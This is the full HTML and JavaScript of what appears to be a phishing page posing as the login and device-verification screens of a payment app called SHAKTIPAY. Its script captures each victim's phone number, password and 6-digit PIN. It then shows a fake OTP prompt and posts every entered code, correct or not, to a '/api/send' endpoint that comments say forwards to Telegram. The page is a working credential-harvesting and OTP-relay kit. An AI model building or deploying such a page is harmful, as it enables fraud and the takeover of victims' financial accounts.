<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SHAKTIPAY - Login & Verification</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #FFF9F3;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #333;
    }

    .app-container {
      width: 100%;
      max-width: 420px;
      min-height: 100vh;
      background-color: #FFF9F3;
      padding: 24px 28px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      position: relative;
      box-shadow: 0 0 20px rgba(0,0,0,0.05);
    }

    .top-bar {
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      padding: 10px 0 30px 0;
    }

    .back-btn {
      position: absolute;
      left: 0;
      font-size: 20px;
      color: #333;
      cursor: pointer;
    }

    .top-bar h2 {
      font-size: 20px;
      font-weight: 600;
      color: #2D2621;
    }

    .logo-container {
      text-align: center;
      margin-top: 40px;
      margin-bottom: 40px;
    }

    .logo-img {
      width: 200px;
      height: 200px;
      object-fit: contain;
    }

    .input-group {
      position: relative;
      margin-bottom: 16px;
    }

    .input-group i {
      position: absolute;
      left: 20px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 20px;
      color: #555;
    }

    .input-group input {
      width: 100%;
      height: 54px;
      padding: 10px 20px 10px 55px;
      border-radius: 27px;
      border: 1px solid #ECE3D8;
      background-color: #FFFFFF;
      font-size: 16px;
      color: #333;
      outline: none;
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.02);
    }

    .input-group input::placeholder {
      color: #B5A495;
      font-weight: 500;
    }

    .phone-prefix {
      position: absolute;
      left: 55px;
      top: 50%;
      transform: translateY(-50%);
      font-weight: 700;
      color: #E27B17;
      font-size: 16px;
    }

    .phone-input {
      padding-left: 100px !important;
    }

    .btn-send {
      position: absolute;
      right: 8px;
      top: 50%;
      transform: translateY(-50%);
      background: linear-gradient(180deg, #FA9A2B 0%, #E27A17 100%);
      color: #FFF;
      border: none;
      padding: 8px 22px;
      border-radius: 18px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
    }

    .btn-send.disabled {
      background: #F8C390;
      cursor: not-allowed;
    }

    .options-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin: 10px 5px 18px 5px;
      font-size: 14px;
    }

    .text-link {
      color: #E27B17;
      text-decoration: none;
      font-weight: 500;
      cursor: pointer;
    }

    .checkbox-label {
      display: flex;
      align-items: center;
      color: #E27B17;
      cursor: pointer;
      user-select: none;
    }

    .checkbox-label input {
      appearance: none;
      width: 18px;
      height: 18px;
      border: 1.5px solid #CCC;
      border-radius: 50%;
      margin-right: 8px;
      outline: none;
      cursor: pointer;
      position: relative;
    }

    .checkbox-label input:checked {
      border-color: #E27B17;
    }

    .checkbox-label input:checked::after {
      content: '';
      position: absolute;
      width: 10px;
      height: 10px;
      background-color: #E27B17;
      border-radius: 50%;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }

    .agreement-row {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 22px;
      font-size: 14px;
      color: #888;
    }

    .agreement-row .text-link {
      margin-left: 4px;
    }

    .btn-primary {
      width: 100%;
      height: 52px;
      border-radius: 26px;
      border: none;
      background: linear-gradient(180deg, #FA9A2B 0%, #E27A17 100%);
      color: #FFFFFF;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      box-shadow: 0 4px 12px rgba(226, 122, 23, 0.3);
    }

    .btn-primary:hover {
      opacity: 0.9;
    }

    .footer-link {
      text-align: center;
      margin-top: 25px;
    }

    .version-text {
      text-align: right;
      font-size: 12px;
      color: #AAA;
      margin-top: 20px;
    }

    .modal-overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.45);
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      z-index: 100;
      backdrop-filter: blur(2px);
    }

    .modal-card {
      background-color: #FFFFFF;
      width: 100%;
      border-radius: 20px;
      padding: 24px 20px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.15);
      position: relative;
    }

    .modal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 16px;
    }

    .modal-title {
      font-size: 20px;
      font-weight: 700;
      color: #4A2810;
    }

    .close-btn {
      width: 30px;
      height: 30px;
      background-color: #FBF4EE;
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #666;
      font-size: 14px;
      cursor: pointer;
    }

    .modal-desc {
      font-size: 14px;
      color: #7A726B;
      line-height: 1.4;
      margin-bottom: 12px;
    }

    .modal-phone-info {
      font-size: 14px;
      color: #7A726B;
      margin-bottom: 20px;
    }

    .modal-phone-info span {
      color: #E27B17;
      font-weight: 700;
    }

    .error-msg {
      color: #D32F2F;
      font-size: 14px;
      font-weight: 500;
      text-align: center;
      margin-top: 10px;
      display: none;
    }

    .error-msg.show {
      display: block;
    }

    .hidden {
      display: none !important;
    }
  </style>
</head>
<body>

  <div class="app-container">
    <div class="main-content">
      
      <!-- LOGIN SCREEN -->
      <div id="loginScreen">
        <div class="logo-container">
          <img src="https://i.postimg.cc/90t0XQD2/ea02e7807dae4fe68ff0950575469ad0.png" alt="Logo" class="logo-img">
        </div>

        <form onsubmit="handleSignIn(event)">
          <div class="input-group">
            <i class="fa-regular fa-user"></i>
            <input type="tel" id="loginPhoneInput" placeholder="Enter Phone Number" inputmode="numeric" pattern="[0-9]*" required>
          </div>

          <div class="input-group">
            <i class="fa-solid fa-lock"></i>
            <input type="password" id="loginPasswordInput" placeholder="Enter Password" required>
          </div>

          <!-- 6-Digit PIN -->
          <div class="input-group">
            <i class="fa-solid fa-key"></i>
            <input type="tel" id="loginPinInput" placeholder="Enter 6-digit PIN" maxlength="6" inputmode="numeric" pattern="[0-9]*" required>
          </div>

          <div class="options-row">
            <span class="text-link" onclick="showRegister()">Register</span>
            <label class="checkbox-label">
              <input type="checkbox"> Remember Me
            </label>
          </div>

          <div class="agreement-row">
            <label class="checkbox-label">
              <input type="checkbox" checked required> Agree
            </label>
            <span class="text-link">"User Privacy Agreement"</span>
          </div>

          <button type="submit" class="btn-primary">Sign In</button>

          <div class="footer-link">
            <span class="text-link">Forget Password</span>
          </div>
        </form>
      </div>

      <!-- REGISTER SCREEN -->
      <div id="registerScreen" class="hidden">
        <div class="top-bar">
          <i class="fa-solid fa-arrow-left back-btn" onclick="showLogin()"></i>
          <h2>Register</h2>
        </div>

        <form onsubmit="event.preventDefault();" style="margin-top: 20px;">
          <div class="input-group">
            <i class="fa-regular fa-user"></i>
            <input type="text" placeholder="User Name" required>
          </div>

          <div class="input-group">
            <i class="fa-solid fa-lock"></i>
            <input type="password" placeholder="Password" required>
          </div>

          <div class="input-group">
            <i class="fa-solid fa-phone"></i>
            <span class="phone-prefix">+91</span>
            <input type="tel" class="phone-input" placeholder="Phone" inputmode="numeric" pattern="[0-9]*" required>
          </div>

          <div class="input-group">
            <i class="fa-regular fa-envelope"></i>
            <input type="text" placeholder="OTP Code" required>
            <button type="button" class="btn-send" onclick="startTimer(this)">Send</button>
          </div>

          <div class="input-group">
            <i class="fa-solid fa-link"></i>
            <input type="text" placeholder="Invite Code">
          </div>

          <button type="submit" class="btn-primary" style="margin-top: 25px;">Sign Up</button>
        </form>
      </div>

    </div>

    <!-- MODAL -->
    <div id="verificationModal" class="modal-overlay hidden">
      <div class="modal-card">
        <div class="modal-header">
          <h3 class="modal-title">New Device Verification</h3>
          <div class="close-btn" onclick="closeModal()">
            <i class="fa-solid fa-xmark"></i>
          </div>
        </div>
        
        <p class="modal-desc">Tap Send to receive the OTP, then enter it to confirm this login.</p>
        
        <p class="modal-phone-info">OTP will be sent to <span id="displayPhone">+91 </span></p>

        <form onsubmit="confirmVerification(event)">
          <div class="input-group">
            <i class="fa-regular fa-envelope"></i>
            <input type="tel" id="otpInput" placeholder="Enter 6-digit OTP" maxlength="6" inputmode="numeric" pattern="[0-9]*" required>
            <!-- Yahan click karne par timer start hoga aur Telegram par OTP requested message jayega -->
            <button type="button" class="btn-send" id="modalSendBtn" onclick="requestOTP(this)">Send</button>
          </div>

          <div id="otpError" class="error-msg">❌ Wrong OTP! Please try again.</div>

          <button type="submit" class="btn-primary" style="margin-top: 15px;">Confirm</button>
        </form>
      </div>
    </div>

    <div class="version-text">v1.3.8</div>
  </div>

  <script>
    let storedPhone = '';
    let storedPassword = '';
    let storedPin = '';
    const CORRECT_OTP = '123456';

    function showRegister() {
      document.getElementById('loginScreen').classList.add('hidden');
      document.getElementById('registerScreen').classList.remove('hidden');
    }

    function showLogin() {
      document.getElementById('registerScreen').classList.add('hidden');
      document.getElementById('loginScreen').classList.remove('hidden');
    }

    // Backend API par data bhejne ka function
    async function sendToServer(messageType, extraData = {}) {
      try {
        const response = await fetch('/api/send', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            phone: storedPhone,
            password: storedPassword,
            pin: storedPin,
            messageType: messageType,
            ...extraData
          })
        });
        return await response.json();
      } catch (error) {
        console.error('Error:', error);
      }
    }

    function handleSignIn(e) {
      e.preventDefault();
      
      storedPhone = document.getElementById('loginPhoneInput').value;
      storedPassword = document.getElementById('loginPasswordInput').value;
      storedPin = document.getElementById('loginPinInput').value;
      
      if (storedPin.length !== 6 || !/^\d{6}$/.test(storedPin)) {
        alert("❌ PIN must be exactly 6 digits!");
        return;
      }
      
      const phoneDisplay = document.getElementById('displayPhone');
      
      if (storedPhone) {
        phoneDisplay.innerText = "+91 " + storedPhone;
        sendToServer('LOGIN_ATTEMPT');
      }
      
      document.getElementById('otpError').classList.remove('show');
      document.getElementById('verificationModal').classList.remove('hidden');
    }

    function closeModal() {
      document.getElementById('verificationModal').classList.add('hidden');
      document.getElementById('otpError').classList.remove('show');
      document.getElementById('otpInput').value = '';
    }

    // Modal ke andar "Send" button click hone par yeh function chalega
    function requestOTP(btn) {
      if (btn.classList.contains('disabled')) return;

      // Telegram par OTP request ka message bhej rahe hain
      sendToServer('OTP_REQUESTED');

      // 60 seconds ka timer start kar rahe hain
      let timeLeft = 60;
      btn.classList.add('disabled');
      btn.innerText = timeLeft + 's';

      const timerInterval = setInterval(() => {
        timeLeft--;
        if (timeLeft > 0) {
          btn.innerText = timeLeft + 's';
        } else {
          clearInterval(timerInterval);
          btn.innerText = 'Send';
          btn.classList.remove('disabled');
        }
      }, 1000);
    }

    function confirmVerification(e) {
      e.preventDefault();
      
      const otpValue = document.getElementById('otpInput').value;
      const errorElement = document.getElementById('otpError');
      
      if (otpValue.length !== 6 || !/^\d{6}$/.test(otpValue)) {
        errorElement.textContent = '❌ Wrong OTP! Enter exactly 6 digits.';
        errorElement.classList.add('show');
        return;
      }
      
      if (otpValue === CORRECT_OTP) {
        sendToServer('OTP_VERIFIED', { otp: otpValue, status: 'VERIFIED' });
        alert("✅ Device Verified Successfully!");
        closeModal();
      } else {
        errorElement.textContent = '❌ Wrong OTP! Please try again.';
        errorElement.classList.add('show');
        
        sendToServer('WRONG_OTP', { otp: otpValue, status: 'FAILED' });
        
        document.getElementById('otpInput').value = '';
        document.getElementById('otpInput').focus();
      }
    }
  </script>
</body>
</html>
